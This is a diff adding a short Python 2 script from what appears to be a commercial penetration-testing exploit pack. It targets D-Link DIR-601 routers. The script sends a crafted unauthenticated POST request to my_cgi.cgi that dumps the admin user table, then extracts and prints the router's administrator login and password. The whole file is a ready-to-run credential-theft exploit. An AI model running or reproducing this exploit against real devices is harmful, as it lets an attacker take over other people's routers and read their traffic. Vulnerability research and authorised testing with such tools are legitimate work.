@@ -1,0 +1,49 @@
+#! /usr/bin/env python2
+ 
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2018
+#
+
+###
+# STD modules
+###
+import os, sys, re
+import requests
+
+_name_   = 'd2sec_link_22'
+_vendor_ = 'd-link'
+_model_  = ['DIR-601']
+_vuln_   = 'Credentials Disclosure Vulnerability'
+_cve_    = ''
+_ref_    = 'https://www.exploit-db.com/exploits/45002/'
+_port_   = 8083
+
+def pwnrouter(host,port=_port_):
+  try:
+    url = 'http://%s:%d/my_cgi.cgi' % (host,port)
+    headers = {'Content-Type': 'application/x-www-form-urlencoded'}
+    data = 'request=no_auth&request=load_settings&table_name=create_auth_pic&table_name=admin_user'
+    response = requests.post(url, headers=headers, data=data)
+  except Exception, e:
+    print '[-] error : %s' % e
+    return
+  if response is None:
+    print '[+] %s not vulnerable' % host
+  if '<admin_user_pwd>' in response.text:
+    print '[+] %s vulnerable\n' % host
+    m = re.search('<admin_user_name>(.+?)</admin_user_name><admin_user_pwd>(.+?)</admin_user_pwd>', response.text, re.DOTALL)
+    if m is None:
+      print '[+] Credentials not found'
+      print response.text        
+    else:            
+      print 'Login: %s\nPassword: %s\n'%(m.group(1),m.group(2))
+      print '===\n\n%s'%response.text
+  else:            
+    print '[+] %s not vulnerable' % host
+
+
+if __name__ == "__main__":
+  pwnrouter(sys.argv[1], int(sys.argv[2]))
